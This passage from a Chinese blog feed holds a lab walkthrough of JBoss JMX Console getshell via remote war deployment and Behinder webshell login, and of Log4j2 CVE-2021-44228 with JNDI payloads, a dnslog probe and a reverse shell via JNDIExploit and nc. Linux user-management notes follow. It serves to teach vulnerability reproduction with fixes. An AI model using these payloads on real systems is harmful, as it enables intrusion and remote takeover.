src="http://120.48.107.243:9090/blog/2023/04/03/50ebc212758f4d4880bb3880cc5369b4.png" alt="在这里插入图片描述"><br>修复方案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用强口令</span><br></pre></td></tr></table></figure><h2 id="6、低版本JMX-Console未授权访问Getshell"><a href="#6、低版本JMX-Console未授权访问Getshell" class="headerlink" title="6、低版本JMX Console未授权访问Getshell"></a>6、低版本JMX Console未授权访问Getshell</h2><p>漏洞描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此漏洞主要是由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进⼊到 jmx控制台，并在其中执行任何功能。  </span><br></pre></td></tr></table></figure><p>影响范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Jboss4.x以下</span><br></pre></td></tr></table></figure><p>环境搭建<br>使用  CVE-2017-7504 环境 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/jboss/CVE-2017-7504</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>漏洞复现<br>访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:8080/</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/6e311950405d4197be91337357ed3e7e.png" alt="在这里插入图片描述"><br>这里我们使用的复现环境是不存在的 , 所以需要密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/f6dfb557812346e0a8c40b81bffc6f5b.png" alt="在这里插入图片描述"><br>然后找到 <strong>jboss.deployment</strong>（jboss 自带的部署功能）中的flavor&#x3D;URL,type&#x3D;DeploymentScanner点进去（通过 url 的方式远程部署）<br><img src="http://120.48.107.243:9090/blog/2023/04/03/945512d6b1d79d3e9f5d441ab7eb35c1.png" alt="image-20220906194452936"><br>找到页面中的 void addURL() 选项来远程加载war包来部署<br><img src="http://120.48.107.243:9090/blog/2023/04/03/3ff18330319d0421d36d05a6a8fb4c4f.png" alt="image-20220906194559654"><br>制作war包 , 这里用之前制作好的 test.war , 然后用 python 开启web服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><p>填写war包远程地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.112:8000/test.war</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/c16a8b673cb64264aadc3dcd3d88300f.png" alt="在这里插入图片描述"><br>然后跳转以下页面<br><img src="http://120.48.107.243:9090/blog/2023/04/03/fe3db90ded424cc2bec22e7414e07191.png" alt="在这里插入图片描述"><br>然后冰蝎链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:8080/shell/shell.jsp</span><br><span class="line">rebeyond</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/56c0a1387678e22f5be8558314f5938f.png" alt="image-20220906195135437"><br>##7、高版本JMX Console未授权访问getshell<br>漏洞描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JMX Console默认存在未授权访问，直接点击JBoss主页中的 JMX Console 链接进入JMX Console页面 , 通过部署war包 , getshell</span><br></pre></td></tr></table></figure><p>影响版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Jboss6.x以下</span><br></pre></td></tr></table></figure><p>环境搭建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/jboss/CVE-2017-12149</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>漏洞复现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:8080/jmx-console/</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/95e3df6fd20e4e15837cb641f6268a6c.png" alt="在这里插入图片描述"><br>这里使用的环境是 CVE-2017-12149 , 所以需要输入密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">vulhub</span><br></pre></td></tr></table></figure><p>本地搭建部署点<br>在JMX Console页面点击jboss.system链接，在Jboss.system页面中点击service&#x3D;MainDeployer，如下<br><img src="http://120.48.107.243:9090/blog/2023/04/03/af6008f2fe684d85b69792b979b97cc9.png" alt="在这里插入图片描述"><br>进入service&#x3D;MainDeployer页面之后，找到methodIndex为17或19的deploy 填写远程war包地址进行远程部署<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d13baadd87b047aab71b4309c8b4cb2c.png" alt="在这里插入图片描述"><br>搭建远程部署 , 部署远程war包地址<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2d110190079949e2836a8be26aa21bad.png" alt="在这里插入图片描述"><br>然后输入Invoke</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.112:8000/test.war</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/0da5ba7c788bdfc04eb159931412b6e8.png" alt="image-20220906200728471"><br>点击Invoke<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7571de8d02bdfa8be4e154e9800a2f7a.png"><br>使用冰蝎链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.159:8080/test/test.jsp</span><br><span class="line">rebeyond</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/a529b0c16e50e428e7f2baca7f464043.png" alt="image-20220906200904439"><br>#五、log4j2(核弹漏洞)<br>##1、log4j2介绍<br><strong>Apache Log4j是一个基于Java的日志记录组件</strong>。Apache Log4j2是Log4j的升级版本，通过重写Log4j引入了丰富的功能特性。该日志组件被广泛应用于业务系统开发，用以<strong>记录程序输入输出日志信息。</strong></p><p>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。</p><h2 id="2、CVE-2021-44228"><a href="#2、CVE-2021-44228" class="headerlink" title="2、CVE-2021-44228"></a>2、CVE-2021-44228</h2><p>log4j2远程代码执行<br>漏洞描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Apache Log4j2 中存在 JNDI注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。</span><br><span class="line">通俗简单的说就是：在打印日志的时候，如果你的日志内容中包含关键词 $&#123;，攻击者就能将关键字所包含的内容当作变量来替换成任何攻击命令，并且执行。由于 Apache Log4j2 的某些函数具有递归分析函数，因此攻击者可以直接构造恶意请求来触发远程代码执行漏洞。</span><br><span class="line">$&#123;jndi:ldap://ibc23d.dnslog.cn/test&#125;</span><br></pre></td></tr></table></figure><p>影响版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.0 &lt;= Apache log4j2 &lt;= 2.14.1</span><br></pre></td></tr></table></figure><p>环境搭建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/log4j/CVE-2021-44228</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>Apache Log4j2 不是一个特定的Web服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如Apache Solr。具体文件 , log4j-api, log4j-core 两个jar包<br>漏洞复现<br>访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:8983</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/91a8be953d4f45519bab9b85c3b2f001.png" alt="在这里插入图片描述"><br>直接访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.fivlgu.dnslog.cn&#125;</span><br><span class="line">dnslog</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/0c771171d48e46e991f0c9cf502e6ecd.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/6bf1151e0ea24bc28f55cdfd077900ff.png" alt="在这里插入图片描述"><br>收到dns请求 , 说明存在漏洞</p><p>漏洞利用 使用 JNDI注入工具getshell</p><p>在kali上运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 192.168.23.133</span><br></pre></td></tr></table></figure><p>开启监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5656</span><br></pre></td></tr></table></figure><p>构造以下命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.23.133:1389/Basic/ReverseShell/192.168.23.133/5656&#125;</span><br></pre></td></tr></table></figure><p>成功反弹shell<br><img src="http://120.48.107.243:9090/blog/2023/04/03/c9471eae0f004db5aff14fe2c718454c.png" alt="在这里插入图片描述"><br>漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">升级log4j2版本</span><br><span class="line">安全版本</span><br><span class="line">Apache log4j-2.15.0-rc2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 安全知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 安全知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习笔记（四）用户管理</title>
      <link href="/2021/09/28/linux_study_four/"/>
      <url>/2021/09/28/linux_study_four/</url>
      
        <content type="html"><![CDATA[<h1 id="一、用户和用户组操作命令"><a href="#一、用户和用户组操作命令" class="headerlink" title="一、用户和用户组操作命令"></a>一、用户和用户组操作命令</h1><h2 id="1、ID"><a href="#1、ID" class="headerlink" title="1、ID"></a>1、ID</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/51d08ed13c1c4131a6bb11f24b922e63.png" alt="在这里插入图片描述"></p><h2 id="2、Finger"><a href="#2、Finger" class="headerlink" title="2、Finger"></a>2、Finger</h2><p>finger命令是linux下的一个系统管理命令,具体命令的语法格式为finger[参数],它主要有一个功能,finger命令能够去寻找并且显示指定账号的用户有关信息,以及本地与远程主机的用户也都可以,账号名称是没有大小写的差别的。</p><h2 id="3、Pwck"><a href="#3、Pwck" class="headerlink" title="3、Pwck"></a>3、Pwck</h2><p>检查&#x2F;etc&#x2F;passwd 配置文件内的信息与实际主文件夹是否存在，还可比较&#x2F;etc&#x2F;passwd 和&#x2F;etc&#x2F;shadow 的信<br>息是否一致，另外如果&#x2F;etc&#x2F;passwd 中的数据字段错误也会提示。</p><h2 id="4、Grpck"><a href="#4、Grpck" class="headerlink" title="4、Grpck"></a>4、Grpck</h2><p>使用grpck命令可以检查组群信息的完整性。它检查&#x2F;etc&#x2F;group和&#x2F;etc&#x2F;gshadow文件中具有正确格式并包含有效数据的所有条目。</p><h2 id="5、Groups"><a href="#5、Groups" class="headerlink" title="5、Groups"></a>5、Groups</h2><p>主要用于打印指定用户所在组的名称</p><h2 id="6、newgrp"><a href="#6、newgrp" class="headerlink" title="6、newgrp"></a>6、newgrp</h2><p>Linux newgrp 命令用于登入另一个群组。 newgrp 指令类似 login 指令,当它是以相同的帐号,另一个群组名称,再次登入系统。</p><h2 id="7、useradd"><a href="#7、useradd" class="headerlink" title="7、useradd"></a>7、useradd</h2><p>useradd命令用于建立用户帐号。如果在没有-D选项的情况下调用,useradd命令将使用命令行上指定的值加上系统中的默认值创建一个新的用户帐户。</p><h2 id="8、usermod"><a href="#8、usermod" class="headerlink" title="8、usermod"></a>8、usermod</h2><p>usermod 不仅能改用户的 SHELL 类型，所归属的用户组，也能改用户密码的有效期，还能改登录名。usermod 如此看来就是能做到用户帐号大转移；比如我把用户 A 改为新用户 B；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">usermod [-u uid [-o]] [-g group] [-G group,...]</span><br><span class="line">[-d 主目录 [-m]] [-s shell] [-c 注释] [-l 新名称]</span><br><span class="line">[-f 失效日] [-e 过期日] [-p 密码] [-L|-U] 用户名</span><br><span class="line">usermod 命令会参照你命令列上指定的部份修改系统帐号档。下列为 usermod 可选用的参数。</span><br><span class="line">-c comment更新用户帐号 password 档中的注解栏，一般是使用 chfn(1)来修改。</span><br><span class="line">-d home_dir更新用户新的登入目录。如果给定-m 选项，用户旧目录会搬到新的目录去，如旧目录不存在则建个新的。</span><br><span class="line">-e expire_date 加上用户帐号停止日期。日期格式为 MM/DD/YY.</span><br><span class="line">-f inactive_days 帐号过期几日后永久停权。当值为 0 时帐号则立刻被停权。而当值为-1 时则关闭此功能。预设值为-1。</span><br><span class="line">-g initial_group 更新用户新的起始登入用户组。用户组名须已存在。用户组 ID 必须参照既有的的用户组。用户组 ID 预设值为 1。</span><br><span class="line">-G group,[...] 定义用户为一堆 groups 的成员。每个用户组使用&quot;,&quot;区格开来，不可以夹杂空白字元。用户组名同-g 选项的</span><br><span class="line">限制。如果用户现在的用户组不再此列，则将用户由该用户组中移除。</span><br><span class="line">-l login_name 变更用户 login 时的名称为 login_name。其它不变。特别是，用户目录名应该也会跟着更动成新的登入名。</span><br><span class="line">-s shell 指定新登入 shell。如此栏留白，系统将选用系统预设 shell。</span><br><span class="line">-u uid 用户 ID 值。必须为唯一的 ID 值，除非用-o 选项。数字不可为负值。预设为最小不得小于/etc/login.defs 中定义的UID_MIN 值。0 到 UID_MIN 值之间是传统上保留给系统帐号使用。用户目录树下所有的档案目录其 userID 会自动改变。放在用户目录外的档案则要自行手动更动。</span><br><span class="line">警告:usermod 不允许你改变正在线上的用户帐号名称。当 usermod 用来改变 userID,必须确认这名 user 没在电脑上执行任何程序。你需手动更改用户的 crontab 档。也需手动更改用户的 at 工作档。采用 NISserver 须在 server 上更动相关的 NIS 设定。</span><br></pre></td></tr></table></figure><p><strong>usermod最好不要用它来改用户的密码，因为他在&#x2F;etc&#x2F;shadow中显示的是明口令，修改用户的口令最好用passwd。</strong></p><h2 id="9、userdel"><a href="#9、userdel" class="headerlink" title="9、userdel"></a>9、userdel</h2><p>userdel 很简单，只有一个参数可选 -r ；如果加参数-r ，表示在删除用户的同时，一并把用户的家目录及本地邮件存储的目录或文件也一同删除。<br>请不要轻易用-r参数，他会删除用户的同时删除用户所有的文件和目录。</p><h2 id="10、Groupadd"><a href="#10、Groupadd" class="headerlink" title="10、Groupadd"></a>10、Groupadd</h2><p>groupadd是添加用户组的命令 linux命令:groupadd详解 用法:groupadd [选项]组 选项: -f, –force 如果组已经存在则成功退出</p><h2 id="11、groupdel"><a href="#11、groupdel" class="headerlink" title="11、groupdel"></a>11、groupdel</h2><p>groupdel命令用于删除群组。 需要从系统上删除群组时,可用groupdel(group delete)指令来完成这项工作。倘若该群组中仍包括某些用户,则必须先删除这些用户后,方能删除群组。</p><h2 id="12、passwd"><a href="#12、passwd" class="headerlink" title="12、passwd"></a>12、passwd</h2><p>passwd 作为普通用户和超级权限用户都可以运行，但作为普通用户只能更改自己的用户密码，但前提是没有被 root 用户锁定；如果 root 用户运行 passwd ，可以设置或修改任何用户的密码。<br><strong>如果passwd命令后不接任何参数或用户名，则表示修改当前用户的密码。</strong></p><h2 id="13、chage"><a href="#13、chage" class="headerlink" title="13、chage"></a>13、chage</h2><p>chage 用语法格式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chage [-l] [-m 最小天数] [-M 最大天数] [-W 警告] [-I 失效日] [-E 过期日] [-d 最后日] 用户</span><br></pre></td></tr></table></figure><p>前面已经说的好多了，这个只是一笔带过吧，知道有这个命令就行，自己实践实践再说，大体和 psswd 有些参数的用法差不多。</p><h2 id="14、id工具"><a href="#14、id工具" class="headerlink" title="14、id工具"></a>14、id工具</h2><p>id 工具是用来查询用户信息，比如用户所归属的用户组，UID 和 GID 等；id 用法极为简单；我们举个例子说明一下；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法格式： id [参数] [用户名]</span><br></pre></td></tr></table></figure><p>至于有哪些参数，自己查一下 id –help 或 man id ；如果 id 后面不接任何参数和任何用户，默认显示当前操作用户的用户名、所归属的用户组、UID 和 GID 等。</p><h2 id="15、Finger工具：用来查询用户信息，侧重用户家目录，登录shell等。"><a href="#15、Finger工具：用来查询用户信息，侧重用户家目录，登录shell等。" class="headerlink" title="15、Finger工具：用来查询用户信息，侧重用户家目录，登录shell等。"></a>15、Finger工具：用来查询用户信息，侧重用户家目录，登录shell等。</h2><p>finger 工具侧重于用户信息的查询；查询的内容包括用户名（也被称为登录名 Login），家目录，用户真实的名字（Name）… …办公地址、办公电话；也包括登录终端、写状态、空闭时间等。<br>我们最常用 finger 来查询用户家目录、用户真实名、所用 SHELL 类型、以及办公地址和电话，这是以参数 -l 长格式输出的；而修改用户的家目录、真实名字、办公地址及办公电话，我们一般要能过 chfn 命令进行。</p><h2 id="16、查询登录主机的用户工具：w、who、users"><a href="#16、查询登录主机的用户工具：w、who、users" class="headerlink" title="16、查询登录主机的用户工具：w、who、users"></a>16、查询登录主机的用户工具：w、who、users</h2><p>w、who 和 users 工具，是查询已登录当前主机的用户；另外 finger -s 也同样能查询；侧重点不一样；请自己对比着看。</p><h2 id="17、groups用户所归属的用户组查询"><a href="#17、groups用户所归属的用户组查询" class="headerlink" title="17、groups用户所归属的用户组查询"></a>17、groups用户所归属的用户组查询</h2><p>groups 用法很简单，就是查询用户所归属哪个或哪些用户组；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法格式： groups 用户名</span><br></pre></td></tr></table></figure><h1 id="二、相关配置文件"><a href="#二、相关配置文件" class="headerlink" title="二、相关配置文件"></a>二、相关配置文件</h1><p>&#x2F;etc&#x2F;passwd：Linux&#x2F;UNIX安全的关键文件之一.该文件用于用户登录时校验 用户的口令<br>&#x2F;etc&#x2F;shadow：密码文件存放路径<br>&#x2F;etc&#x2F;gshadow：组用户的密码信息存储在 &#x2F;etc&#x2F;gshadow 文件中<br>&#x2F;etc&#x2F;group：组用户信息存储在 &#x2F;etc&#x2F;group 文件中</p><h1 id="三、Linux用户密码策略"><a href="#三、Linux用户密码策略" class="headerlink" title="三、Linux用户密码策略"></a>三、Linux用户密码策略</h1><p>Linux 用户密码的有效期,是否可以修改密码可以通过 login.defs 文件控制.对 login.defs 文件修只影响后续<br>建立的用户,如果要改变以前建立的用户的有效期等可以使用 chage 命令，Linux 用户密码的复杂度可以通过 pam pam_cracklib module 或 pam_passwdqc module 控制,两者不能同时使用。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/etc/login.defs 密码策略</span><br><span class="line">PASS_MAX_DAYS 99999 #密码的最大有效期, 99999:永久有期</span><br><span class="line">PASS_MIN_DAYS 0 #是否可修改密码,0 可修改,非 0 多少天后可修改</span><br><span class="line">PASS_MIN_LEN 5 #密码最小长度,使用 pam_cracklib module,该参数不再有效</span><br><span class="line">PASS_WARN_AGE 7 #密码失效前多少天在用户登录时通知用户修改密码</span><br><span class="line">pam_cracklib 主要参数说明:</span><br><span class="line">tretry=N:重试多少次后返回密码修改错误</span><br><span class="line">difok=N:新密码必需与旧密码不同的位数</span><br><span class="line">dcredit=N: N &gt;= 0:密码中最多有多少个数字;N &lt; 0 密码中最少有多少个数字.</span><br><span class="line">lcredit=N:小宝字母的个数</span><br><span class="line">ucredit=N 大宝字母的个数</span><br><span class="line">credit=N:特殊字母的个数</span><br><span class="line">minclass=N:密码组成(大/小字母,数字,特殊字符)</span><br><span class="line">pam_passwdqc 主要参数说明:</span><br><span class="line">mix:设置口令字最小长度，默认值是 mix=disabled。</span><br><span class="line">max:设置口令字的最大长度，默认值是 max=40。</span><br><span class="line">passphrase:设置口令短语中单词的最少个数，默认值是 passphrase=3，如果为 0 则禁用口令短语。</span><br><span class="line">atch:设置密码串的常见程序，默认值是 match=4。</span><br><span class="line">similar:设置当我们重设口令时，重新设置的新口令能否与旧口令相似，它可以是 similar=permit 允</span><br><span class="line">许相似或 similar=deny 不允许相似。</span><br><span class="line">random:设置随机生成口令字的默认长度。默认值是 random=42。设为 0 则禁止该功能。</span><br><span class="line">enforce:设置约束范围，enforce=none 表示只警告弱口令字，但不禁止它们使用；enforce=users 将</span><br><span class="line">对系统上的全体非根用户实行这一限制；enforce=everyone 将对包括根用户在内的全体用户实行这</span><br><span class="line">一限制。</span><br><span class="line">non-unix:它告诉这个模块不要使用传统的 getpwnam 函数调用获得用户信息，</span><br><span class="line">retry:设置用户输入口令字时允许重试的次数，默认值是 retry=3</span><br></pre></td></tr></table></figure><h1 id="四、ACL权限设置"><a href="#四、ACL权限设置" class="headerlink" title="四、ACL权限设置"></a>四、ACL权限设置</h1><p>ACL是Access Control List的缩写，主要用于在提供传统的owner、group、others 的 read、write、execute权限之外进行细部权限设置。</p><h2 id="1、启动ACL"><a href="#1、启动ACL" class="headerlink" title="1、启动ACL"></a>1、启动ACL</h2><h3 id="（1）让-x2F-目录支持-ACL："><a href="#（1）让-x2F-目录支持-ACL：" class="headerlink" title="（1）让&#x2F;目录支持 ACL："></a>（1）让&#x2F;目录支持 ACL：</h3><p>#mount –o remount ,acl &#x2F;<br>#mount |grep &#x2F; &#x2F;&#x2F;查看是否有挂载</p><h3 id="（2）开机启动-ACL："><a href="#（2）开机启动-ACL：" class="headerlink" title="（2）开机启动 ACL："></a>（2）开机启动 ACL：</h3><p>将要启动 ACL 的分区写入&#x2F;etc&#x2F;fstab 中：<br>#vi &#x2F;etc&#x2F;fstab<br>&#x2F;dev&#x2F;hda5 &#x2F; ext3 default,acl 1 2</p><h2 id="2、ACL相关命令"><a href="#2、ACL相关命令" class="headerlink" title="2、ACL相关命令"></a>2、ACL相关命令</h2><p>Getfacl :取得某个文件&#x2F;目录的 ACL 权限；<br>Setfacl :设置某个文件&#x2F;目录的 ACL 权限；<br>setfacl [-bkndRLPvh] [{-m|-x} acl_spec] [{-M|-X} acl_file] file …<br>setfacl –restore&#x3D;file<br>描述<br>setfacl 用来在命令行里设置 ACL。在命令行里，一系列的命令跟随以一系列的文件名。<br>选项-m 和-x 后边跟以 acl 规则。多条 acl 规则以逗号(,)隔开。选项-M 和-X 用来从文件或标准输入读取<br>acl 规则。<br>选项–set 和–set-file 用来设置文件或目录的 acl 规则，先前的设定将被覆盖。<br>选项-m(–modify)和-M(–modify-file)选项修改文件或目录的 acl 规则。<br>选项-x(–remove)和-X(–remove-file)选项删除 acl 规则。<br>当使用-M，-X 选项从文件中读取规则时，setfacl 接受 getfacl 命令输出的格式。每行至少一条规则，以#<br>开始的行将被视为注释。<br>当在不支持 ACLs 的文件系统上使用 setfacl 命令时，setfacl 将修改文件权限位。如果 acl 规则并不完全匹<br>配文件权限位，setfacl 将会修改文件权限位使其尽可能的反应 acl 规则，并会向 standard error 发送错误消息，<br>以大于 0 的状态返回。<br>权限<br>文件的所有者以及有 CAP_FOWNER 的用户进程可以设置一个文件的 acl。（在目前的 linux 系统上，root<br>用户是唯一有 CAP_FOWNER 能力的用户）<br>选项<br>-b,–remove-all<br> 删除所有扩展的 acl 规则，基本的 acl 规则(所有者，群组，其他）将被保留。<br>-k,–remove-default<br> 删除缺省的 acl 规则。如果没有缺省规则，将不提示。<br>-n，–no-mask<br> 不要重新计算有效权限。setfacl 默认会重新计算 ACL mask，除非 mask 被明确的制定。<br>–mask<br> 重新计算有效权限，即使 ACL mask 被明确指定。<br>-d，–default<br> 设定默认的 acl 规则。<br>–restore&#x3D;file<br> 从文件恢复备份的 acl 规则（这些文件可由 getfacl -R 产生）。通过这种机制可以恢复整个目录树的 acl<br>规则。此参数不能和除–test 以外的任何参数一同执行。<br>–test<br> 测试模式，不会改变任何文件的 acl 规则，操作后的 acl 规格将被列出。<br>-R，–recursive<br> 递归的对所有文件及目录进行操作。<br>-L，–logical<br> 跟踪符号链接，默认情况下只跟踪符号链接文件，跳过符号链接目录。<br>-P，–physical<br> 跳过所有符号链接，包括符号链接文件。<br>–version<br> 输出 setfacl 的版本号并退出。<br>–help<br>输出帮助信息。</p><h2 id="标识命令行参数结束，其后的所有参数都将被认为是文件名"><a href="#标识命令行参数结束，其后的所有参数都将被认为是文件名" class="headerlink" title=" 标识命令行参数结束，其后的所有参数都将被认为是文件名"></a> 标识命令行参数结束，其后的所有参数都将被认为是文件名</h2><p> 如果文件名是-，则 setfacl 将从标准输入读取文件名。</p><h1 id="五、用户身份切换"><a href="#五、用户身份切换" class="headerlink" title="五、用户身份切换"></a>五、用户身份切换</h1><h2 id="1、Su"><a href="#1、Su" class="headerlink" title="1、Su"></a>1、Su</h2><p>命令作用<br>su 的作用是变更为其它使用者的身份，超级用户除外，需要键入该使用者的密码。<br>使用方式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su [-fmp] [-c command] [-s shell] [--help] [--version] [-] [USER [ARG]]</span><br></pre></td></tr></table></figure><p>参数说明<br>-f ， –fast：不必读启动文件（如 csh.cshrc 等），仅用于 csh 或 tcsh 两种 Shell。<br>-l ， –login：加了这个参数之后，就好像是重新登陆一样，大部分环境变量(例如 HOME、SHELL<br>和 USER 等)都是以该使用者(USER)为主，并且工作目录也会改变。如果没有指定 USER，缺省情况是 root。<br>-m， -p ，–preserve-environment：执行 su 时不改变环境变数。<br>-c command：变更账号为 USER 的使用者，并执行指令（command）后再变回原来使用者。<br>–help 显示说明文件<br>–version 显示版本资讯<br>USER：欲变更的使用者账号，<br>ARG: 传入新的 Shell 参数。<br>例子<br>su -c ls root 变更帐号为 root 并在执行 ls 指令后退出变回原使用者。<br>[user1@centos6 ~]$ su - root -c “head -n 3 &#x2F;etc&#x2F;passwd” 对于命令参数要加上引号<br>su [用户名]<br>a&gt;在 root 用户下, 输入 su 普通用户. 则切换至普通用户, 从 root 切换到变通用户不需要密码<br>b&gt;在普通用户下, 输入 su [用户名]<br>提示 password:<br>输入用户的 PASSWORD, 则切换至该用户</p><h2 id="2、Sudo"><a href="#2、Sudo" class="headerlink" title="2、Sudo"></a>2、Sudo</h2><p>&#x2F;etc&#x2F;sudoers 谁能作什么的一个列表，Sudo 能用需要在这个文件中定义<br>#visudo 增加如下，加%代表用户组，ALL&#x3D;(ALL)表示登录者的来源主机名，最后的 ALL 代表可执行的命令。NOPASSWD 代表不需要密码直接可运行 Sudo,限制多命令一定要写绝对路径，用逗号分开，多行用‘\’，用！代表不能执行<br>%aixi ALL&#x3D;(ALL) NOPASSWD: ALL<br>%aixi ALL&#x3D;(ALL) NOPASSWD: &#x2F;bin&#x2F;ls,&#x2F;bin&#x2F;mkdir,&#x2F;bin&#x2F;rmdir,<br>&#x2F;usr&#x2F;bin&#x2F;who,!&#x2F;usr&#x2F;bin&#x2F;passwd root</p><h1 id="六、查询用户命令"><a href="#六、查询用户命令" class="headerlink" title="六、查询用户命令"></a>六、查询用户命令</h1><h2 id="1、W"><a href="#1、W" 